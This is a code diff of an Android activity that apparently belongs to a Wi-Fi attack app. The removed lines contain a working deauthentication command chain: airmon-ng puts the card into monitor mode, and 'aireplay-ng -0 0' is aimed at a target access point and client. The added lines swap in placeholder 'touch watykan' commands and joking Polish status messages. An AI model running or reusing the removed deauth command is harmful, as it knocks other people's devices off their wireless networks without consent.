@@ -43,6 +43,33 @@ public class AttackToggle extends AppCompatActivity implements MyCallback {
 
         final Device device = getIntent().getExtras().getParcelable("device");
         Device accessPoint = getIntent().getExtras().getParcelable("accessPoint");
+        int attackNumber = getIntent().getExtras().getInt("attackNumber");
+
+        String tempAttackCommand = "";
+        String tempEndCommand = "";
+        String tempStatusToToastStarted = "";
+        String tempStatusToToastEnded = "";
+
+        if (attackNumber == 1){
+            tempAttackCommand = "touch watykan";
+            tempEndCommand = "rm watykan";
+            tempStatusToToastStarted = "PIERWSZY ATAK NA WATYKAN PRZEPROWADZONO POMYSLNIE";
+            tempStatusToToastEnded = "PIERWSZY ATAK NA WATYKAN ZAKONCZONO POMYSLNIE";
+        }
+        else if (attackNumber == 3){
+            tempAttackCommand = "touch watykan";
+            tempEndCommand = "rm watykan";
+            tempStatusToToastStarted = "TRZECI ATAK NA WATYKAN PRZEPROWADZONO POMYSLNIE";
+            tempStatusToToastEnded = "TRZECI ATAK NA WATYKAN ZAKONCZONO POMYSLNIE";
+        }
+
+        final String attackCommand = tempAttackCommand;
+        final String endCommand = tempEndCommand;
+        final String statusToToastStarted = tempStatusToToastStarted;
+        final String statusToToastEnded = tempStatusToToastEnded;
+
+        Log.d("ATTACK NUMER: ", Integer.toString(attackNumber));
+        Log.d("KOMENDA: ", attackCommand);
 
         getSupportActionBar().setTitle(device.getName());
 
@@ -65,20 +92,20 @@ public class AttackToggle extends AppCompatActivity implements MyCallback {
         macAddressAccessPoint.setText(accessPoint.getMacAddress());
 
         channelAndFreq.setText("Channel: " + device.getChannel() + " Freq: " + device.getFreqmhz());
-
+        
         startAttack.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 Log.d("WALACH","KLIKNIETO");
                 Log.d("--------->", device.getChannel());
-                new executeCommand(AttackToggle.this, "killall kismet; killall airodump-ng; airmon-ng stop wlan1; airmon-ng start wlan1 " + device.getChannel() +  " && tmux new-session -d -s deauthAttack 'aireplay-ng -0 0 -a " + device.getBssid() + " -c " + device.getMacAddress() + " wlan1'","Deauthentication attack launched", "Started").execute();
+                new AttackToggle.executeCommand(AttackToggle.this, attackCommand,statusToToastStarted,"Started").execute();
             }
         });
 
         endAttack.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                new executeCommand(AttackToggle.this,"killall aireplay-ng; tmux kill-session -t deauthAttack; airmon-ng stop wlan1 " + device.getChannel() + "; airmon-ng start wlan1 && airodump-ng wlan1 --output-format netxml -w /tmp/recent > /dev/null 2>&1","Deauthentication attack interrupted","Ended").execute();
+                new AttackToggle.executeCommand(AttackToggle.this,endCommand,statusToToastEnded,"Ended").execute();
             }
         });
 
